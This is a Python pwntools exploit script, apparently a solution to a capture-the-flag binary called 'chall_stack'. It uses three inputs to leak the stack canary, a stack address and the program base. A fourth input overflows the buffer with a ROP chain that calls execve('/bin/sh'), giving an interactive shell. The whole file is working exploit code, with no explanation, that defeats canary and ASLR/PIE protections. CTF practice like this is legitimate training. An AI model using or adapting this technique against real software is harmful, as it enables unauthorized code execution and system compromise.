from pwn import *

filename = './chall_stack'
chall = ELF(filename)

# conn = remote('localhost', 9001)
conn = process(filename)
# conn = gdb.debug(filename, '''
# aslr on
# b main
# p 26''')

# ROP gadget
main_addr = chall.functions['main'].address
## 0x0000000000009643: syscall;
syscall = 0x0000000000009643
## 0x0000000000059a27: pop rax; ret;
pop_rax = 0x0000000000059a27
## 0x0000000000009c3a: pop rdi; ret;
pop_rdi = 0x0000000000009c3a
## 0x00000000000177ce: pop rsi; ret;
pop_rsi = 0x00000000000177ce
## 0x0000000000009b3f: pop rdx; ret;
pop_rdx = 0x0000000000009b3f


# Fist input
buf1 = b'a'*(0x28-0x10)
buf1 += b'!'
conn.sendafter(b'Input (1/4) >> ', buf1)
conn.recvuntil(b'aaaa!')
canary = b'\x00' + conn.recv(0x7)
info("canary = 0x{:08x}".format(u64(canary)))

# Second input
buf2 = b'b'*(0x4f-0x10)
buf2 += b'!'
conn.sendafter(b'Input (2/4) >> ', buf2)
conn.recvuntil(b'bbbb!')
stack_leak = u64(conn.recv(0x6)+b'\x00\x00')
stack_diff = 0x00007ffde10d8da8-0x00007ffde10d8c50
msg_addr = stack_leak - stack_diff
info("stack_leak = 0x{:08x}".format(stack_leak))
info("msg_addr = 0x{:08x}".format(msg_addr))

# Third input
buf3 = b'c'*(0x57-0x10)
buf3 += b'!'
conn.sendafter(b'Input (3/4) >> ', buf3)
conn.recvuntil(b'cccc!')
main_leak = u64(conn.recv(0x6)+b'\x00\x00')
chall_base = main_leak - main_addr
info("main_leak = 0x{:08x}".format(main_leak))
info("chall_base = 0x{:08x}".format(chall_base))

# Forth input
buf4 = b"/bin/sh\x00"
buf4 += b'a'*(0x28-0x10-len(buf4))
buf4 += canary
buf4 += b'b'*0x8
buf4 += p64(pop_rdx + chall_base)
buf4 += p64(0x0)
buf4 += p64(pop_rsi + chall_base)
buf4 += p64(0x0)
buf4 += p64(pop_rdi + chall_base)
buf4 += p64(msg_addr)
buf4 += p64(pop_rax + chall_base)
buf4 += p64(59)
buf4 += p64(syscall + chall_base)
conn.sendafter(b'Input (4/4) >> ', buf4)

conn.interactive()
